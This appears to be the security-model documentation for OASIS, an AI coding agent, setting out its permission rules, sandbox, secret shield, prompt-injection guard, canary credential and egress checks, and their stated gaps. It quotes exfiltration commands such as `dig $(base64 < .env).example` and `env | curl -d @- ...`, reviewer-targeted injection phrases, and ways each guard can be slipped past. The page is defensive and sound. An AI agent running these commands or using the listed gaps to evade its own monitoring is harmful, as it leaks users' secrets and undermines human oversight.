# Security model

This page describes what OASIS enforces, where in the code, and what falls
outside its controls. To report a vulnerability, see
[SECURITY.md](../SECURITY.md) in the repository root.

OASIS runs with the permissions of the user who started it. Its controls
narrow what the agent does by default. They are not a guarantee that a
malicious repository, extension or model cannot do harm.

## Controls OASIS enforces

| Control | What it does | Source |
| --- | --- | --- |
| Permission modes and rules | `allow` / `ask` / `deny` rules for tools, commands and paths; plan mode is read-only; edits and commands ask by default | `src/permissions.mjs`, `src/settings.mjs` |
| Request intent | Commits, pushes, remote and global git config changes and pull requests run only when the current request asks for them (`allowUnrequestedGitWrites` or `OASIS_ALLOW_UNREQUESTED_GIT_WRITES=1` turn this off). A request that rules out file changes without a scope ("Do not change any files", "don't touch anything", "make no changes", "read-only review", and the same in the [languages the task model reads](TASK-MODEL.md#languages), such as "কোনো ফাইল পরিবর্তন করবেন না" or "不要修改任何文件") refuses the file-editing tools for that request in every mode, auto and bypass included, and the model is told to describe the change instead; scoped limits ("no files outside src/", "don't change the code") and conditional ones ("if the claim is denied, do not edit anything") do not. Shell commands are not checked by this | `src/git-intent.mjs` |
| Command risk analysis | Parses shell commands and flags destructive, network, credential and privilege-changing forms before they run, including secrets sent out through a substituted URL or a name lookup (`dig $(base64 < .env).example`) Approval prompts show hidden and direction-changing characters as <U+XXXX>, and a request containing them always asks a person. Long commands keep their start and end visible, with the hidden middle counted. | `src/shell-risk.mjs`, `src/git-safety.mjs`, `src/network-safety.mjs` |
| OS sandbox (opt-in) | bubblewrap on Linux, `sandbox-exec` on macOS, or a Docker/Podman container: read-only host, writable workspace, network off unless enabled, common credential folders masked. The protected configuration files stay read-only inside it (git hooks and config, OASIS/Claude/Cursor/Gemini/Codex settings, MCP and LSP files, `.envrc`, `.husky/`, `.npmrc`, `.devcontainer/` and the rest), and one a sandboxed command creates anyway is moved to `<config>/sandbox-quarantine` when the command ends and reported, so a sandboxed command cannot plant something that runs later outside the sandbox | `src/sandbox.mjs` |
| Remote execution (opt-in) | `"backend": "ssh"` or `"daytona"` runs commands on another machine or a Daytona cloud sandbox, with the workspace synced over rsync; the Daytona token stays in a mode 600 ssh config. See [Execution backends](EXECUTION-BACKENDS.md) | `src/ssh-backend.mjs`, `src/daytona-backend.mjs` |
| Unix-socket block (with the OS sandbox) | Sandboxed commands cannot connect to host Unix sockets such as `/var/run/docker.sock` or an SSH agent: a seccomp filter (the `apply-seccomp` helper from `@anthropic-ai/sandbox-runtime`) refuses `socket(AF_UNIX, …)` on Linux x64/arm64, and the macOS profile denies Unix-socket connects. `sandbox.network.allowAllUnixSockets` / `allowUnixSockets` (macOS only) reopen them and are read from your own settings, `--settings` or policy, never from a repository. On other Linux architectures there is no filter, and `oasis doctor` reports that as a problem | `src/sandbox.mjs` |
| Repository locks | A repository's `allowRead`/`allowWrite` entries cannot reopen a path your own settings deny reading. With an admin-required sandbox (managed `allowManagedDomainsOnly`, or `allowUnsandboxedCommands: false` from policy or `--settings`), a repository's `excludedCommands`, `allowedDomains`, `allowWrite` and `additionalDirectories` give commands nothing, and it cannot turn off a sandbox you enabled | `src/settings.mjs` (`applySandboxLocks`) |
| Domain allow-list (opt-in) | With `sandbox.allowedDomains`, commands go through a proxy that allows only those hosts | `src/sandbox-runtime.mjs` |
| Secret shield (on by default) | Secrets found in tool output are replaced with placeholders before the model sees them, including base64- or hex-encoded ones (`base64 .env`, `xxd -p key.pem`); written logs, sessions and artifacts are redacted with the same rules (Gitleaks-derived). Placeholders are not swapped back for remote A2A agents, commit messages, shared boards, memory or skill proposals. The commit scan (`git_commit` and shell commits) also decodes base64 and hex, so an encoded token is refused like a plain one. | `src/secret-shield.mjs` |
| Prompt-injection guard (on by default) | Web pages, search results, browser text, MCP results, replies from remote A2A agents and the output of shell commands that fetch outside text (`curl`, `wget`, `gh issue view`, `gh pr view`, `gh api`, `glab`) lose hidden Unicode instructions, and text that reads like instructions to an AI is marked as data. After such a result, actions that send data out or change remote state need a person for the rest of the turn, even in auto or bypass mode: shell commands, `git_push`, `create_pull_request`, remote agents, installs and MCP or provider configuration, MCP tools not marked read-only, fetches whose URL carries a query (or a body), and browser typing or script evaluation. Saving a memory, skill proposal, user-profile conclusion, notification or scheduled job is held too, so an injected page cannot plant instructions that later sessions act on. Plain page reads continue. A routine run started by a webhook whose payload reads like an injection starts under the hold. Turns that start without a person typing keep the hold: goal follow-ups (`/goal` and `oasis -p --goal`), `--review` and JSON-schema follow-ups, `/loop` runs after the first, and background-event wake-ups. The `verify` agent (goal verifier, `--review`) also checks the files the judged agent changed for text aimed at it ("note to the reviewer", "graders should ignore...", a pre-written `VERDICT: PASS` comment); a hit is shown to it as not-evidence and its PASS does not count. The same goes for output of the judged code that prints a `VERDICT: PASS` line or tells the reviewer what to decide. Such a hit voids the review only; the main agent is not put under the injection hold, since the text came from its own work, and the next review round can still run checks. Nested tool calls inside `execute_code` are guarded the same way, and so is a later read of a file such a command saved (`read_file`, or `cat`, `head` and the like in the shell) (`curl -o`, `wget -O`, `gh ... > file`). The hold follows the content between agents: the report of a subagent that read a flagged result, its teammate messages, its knowledge-board findings and the shared tasks and checkpoints it writes carry the mark, and the agent that receives them gets the same hold. It also flows down: a held agent cannot get the action done by starting, resuming or messaging a subagent, which inherits the hold | `src/untrusted-content.mjs` |
| Instruction pins (on by default) | Project instruction files (AGENTS.md, CLAUDE.md, CLAUDE.local.md and project rules) are pinned in the OASIS directory the first time they load in a project. Lines added since the pin that pipe a download into a shell, send data to another machine, read credentials or the environment, hide actions from the user, turn off approvals, the sandbox or OASIS's guards, or read like a prompt injection are replaced by a placeholder and the user is shown them; the rest of the file loads. They stay withheld until `oasis instructions trust`, which needs a terminal (no `--yes`) and refuses to run from an OASIS command. Harmless changes update the pin silently. This covers instructions planted by a pull, an install script, or an agent edit, which the memory-write hold does not. `OASIS_INSTRUCTION_PINS=0` turns it off | `src/instruction-pins.mjs` |
| Egress provenance (on by default) | OASIS records which hosts, links and query values outside content (pages, search results, browser text, MCP results, fetching commands) mentioned. A fetch, browser navigation or `curl`/`wget` command that sends data the agent composed (a query value of 100+ characters or holding a 16+ character token-like run of mixed letters and digits, not seen in that content, or a request body of 16+ characters) to a host that only outside content named needs a person, even in auto or bypass mode, and is refused when nobody can answer. Following a link exactly as it appeared, short or plain-word values, hosts the user named in the conversation, `sandbox.allowedDomains` and `domain:` allow rules pass. Unlike the injection hold, this does not depend on the page reading like an attack. `OASIS_EGRESS_PROVENANCE=0` turns it off; it is also off when the injection guard is | `src/egress-provenance.mjs` |
| Canary credential (on by default) | Commands get no real credentials (they are removed from their environment) and one decoy instead, `OASIS_SERVICE_TOKEN`, a random value used by nothing. A tool call whose arguments carry it (a URL, a request body, a command line, a file being written, a message to another agent), as written or reversed, upper-cased, percent-, hex-, base64- or base64url-encoded or split up by separators, is refused before it runs, the rest of the turn's outbound actions need a person (the injection hold above), and the session log records a `canary_tripped` event. Under the bubblewrap sandbox, the emptied `~/.aws` and `~/.ssh` hold decoy files (`credentials`, `id_ed25519`) with the same value, so reading them trips the same wire. Ordinary work never needs the decoy, so a trip is evidence that something read the environment or a credential file and is trying to take data out. `"canaryCredentials": false` or `OASIS_CANARY=0` turns it off | `src/canary-credentials.mjs` |
| Terminal escape guard | Replies from the model are shown with every terminal control sequence removed. Everything the CLI writes is filtered for sequences with effects beyond the screen: clipboard writes (OSC 52), window titles and device control strings, so a planted reply or printed file cannot put a command on your clipboard. Colours, links and Oasis's own `/copy` fallback still work | `src/terminal-guard.mjs` |
| Workspace trust | An untrusted workspace cannot enable its own hooks, MCP servers, or settings that loosen permissions or change where OASIS writes | `src/settings.mjs`, `src/agent.mjs` |
| MCP tool inspection | Tool descriptions with instruction-like or hidden content are withheld and need approval; tool definitions are pinned and a changed definition needs approval again | `src/mcp-trust.mjs` |
| MCP calls | Each MCP tool call asks for approval unless the mode or rules allow it; lazy servers re-check the live tool before calling it | `src/mcp.mjs`, `src/mcp-lazy.mjs` |
| Browser boundaries | Each session gets its own browser process and a private profile deleted on close; the DevTools port is loopback-only. Cross-origin navigation, private addresses (every DNS record) and opaque URLs (`data:`, `file:`, `blob:`) need approval, and a refused one leaves the tab where it was. Obscura additionally refuses private addresses and `file:` until such an approval restarts it with them allowed, and is installed only from a pinned, SHA-256-checked release. Obscura does not pause redirect hops, so a redirect into your network is caught after the request in a session already allowed private addresses ([Browser](BROWSER.md#security)) | `src/browser-tool.mjs`, `src/browser-engine.mjs`, `src/cdp.mjs` |
| Network servers | The web app binds to `127.0.0.1`, always needs its access token, and refuses a non-loopback address without TLS unless `--allow-insecure-lan` is given; the Codex app-server WebSocket refuses a non-loopback address without `--ws-auth` | `src/web.mjs`, `src/remote-access.mjs`, `src/codex-app-server-ws.mjs` |
| Spend limits | `--max-budget-usd`, `--max-requests`, `--max-total-tokens` and zero-budget mode, shared by subagents and reviews | `src/cost-policy.mjs`, `src/pricing.mjs` |

## What is outside these controls

Being explicit here matters more than claiming coverage:

- Instruction pins check new lines against patterns, so a harmful
  instruction worded as ordinary advice loads; files pulled in by `@import`,
  scoped rules and project skills are not pinned yet; and the first version
  of a file OASIS sees is trusted as it is.
- Egress provenance looks at hosts, not meanings: data sent to a host the
  user also named, or to a host no outside content mentioned, is not asked
  about, and a plain-word value under 100 characters passes. Data hidden
  in a URL path rather than a query is not treated as composed.
- The canary credential is checked where it passes through the agent: in
  tool-call arguments. A single command that sends the environment straight
  to the network (`env | curl -d @- ...`) never shows the value to OASIS;
  the sandbox's network controls are what stop that. Compressed or encrypted
  copies of the decoy are not recognised, and command rehearsals do not get
  the decoy.
- The sandbox is off unless you enable it (`"sandbox": { "enabled": true }`
  or `OASIS_SANDBOX=1`). Without it, approved commands run with your full
  permissions. On platforms without a backend, OASIS says so and relies on
  approvals.
- MCP servers, hooks and plugin commands run as normal processes on your
  machine, not inside the command sandbox. Treat installing one like
  installing any program.
- Approval prompts are a review step, not isolation. A command you approve
  can do anything your user can.
- Credential masking in the sandbox covers common folders (`~/.ssh`,
  `~/.aws`, `~/.config/gh` and others). It is defence in depth, not full
  read isolation.
- The secret shield recognises known secret formats. A secret in an
  unrecognised format can still reach the model.
- Spend limits apply to model requests OASIS sends itself. External CLIs,
  MCP servers and hooks that call paid APIs are not counted or blocked.
- Hosted model providers receive the prompts and tool output you send them.
  Use a local model when that is not acceptable.

## Known dependency advisories

`npm audit` on 14 November 2026: the CLI and agent runtime (`package-lock.json`)
have no known advisories. The desktop app's build tooling (`desktop/`) has six
moderate entries, all one advisory:
[GHSA-g3hv-75wg-m249](https://github.com/advisories/GHSA-g3hv-75wg-m249),
pattern amplification in `minimatch` 7.0.0–11.0.0, reached through
`electron-builder` 26.18.0. It needs an attacker to supply the glob pattern;
`electron-builder` only matches the project's own packaging globs at build time,
and it is not part of the installed app. npm's suggested fix is a downgrade to
`electron-builder` 24; it is not applied. An override to `minimatch` 11.0.1 would
be checked by the release build on Windows, macOS and Linux before it is adopted.

## Recommended setup for untrusted code

1. Do not trust the workspace (`oasis trust` is not run), so its hooks, MCP
   servers and permission settings stay off. `oasis trust` lists the hook
   commands, allow rules, permission mode, status line and `.mcp.json` servers
   it would turn on and asks first; without a terminal it needs `--yes`.
2. Turn on the sandbox and leave its network off, or allow only the domains
   you need.
3. Keep the default `ask` behaviour for edits and commands, or use plan mode
   to read only.
4. Use `--zero-budget` or a local model when cost matters, and
   `--max-requests` to bound a long run.
